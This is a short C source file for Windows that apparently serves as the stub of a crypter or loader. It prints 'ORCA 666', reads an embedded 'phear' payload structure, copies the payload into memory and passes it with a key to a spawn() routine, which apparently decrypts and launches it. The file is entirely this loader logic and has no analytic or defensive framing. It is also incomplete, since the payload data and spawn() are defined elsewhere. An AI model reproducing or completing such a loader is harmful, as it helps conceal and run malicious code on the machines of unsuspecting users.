
#include <windows.h>
#include <stdio.h>
#include "patch.h"

void main(HINSTANCE mhandle) {

	printf("ORCA 666 \n");

	phear* payload = (phear*)data;
	char* buffer;

	buffer = (char*)malloc(payload->length);
	memcpy(buffer, payload->payload, payload->length);

	spawn(buffer, payload->length, payload->key);

	free(buffer);
}
